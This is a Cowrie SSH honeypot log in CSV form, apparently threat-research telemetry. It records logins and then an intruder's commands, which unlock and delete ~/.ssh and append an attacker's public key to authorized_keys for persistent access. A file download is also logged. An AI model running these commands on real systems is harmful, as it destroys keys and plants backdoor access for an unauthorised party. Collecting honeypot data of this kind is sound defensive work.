timestamp,app,commands,signature
2023-02-17T22:06:34.818655Z,cowrie,null,Connection to honeypot
2023-02-17T22:06:34.818975Z,cowrie,null,SSH login attempted on cowrie honeypot
2023-02-17T22:06:36.348321Z,cowrie,null,Connection to honeypot
2023-02-17T22:06:36.348450Z,cowrie,null,SSH login successful on cowrie honeypot
2023-02-17T22:06:36.347111Z,cowrie,null,Connection to honeypot
2023-02-17T22:06:36.347394Z,cowrie,null,SSH login successful on cowrie honeypot
2023-02-17T22:06:36.347514Z,cowrie,cd ~; chattr -ia .ssh; lockr -ia .ssh,command attempted on cowrie honeypot
2023-02-17T22:06:36.347624Z,cowrie,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",command attempted on cowrie honeypot
2023-02-17T22:06:36.347719Z,cowrie,lockr -ia .ssh,unknown command attempted on cowrie honeypot
2023-02-17T22:06:36.347954Z,cowrie,null,File downloaded on cowrie honeypot
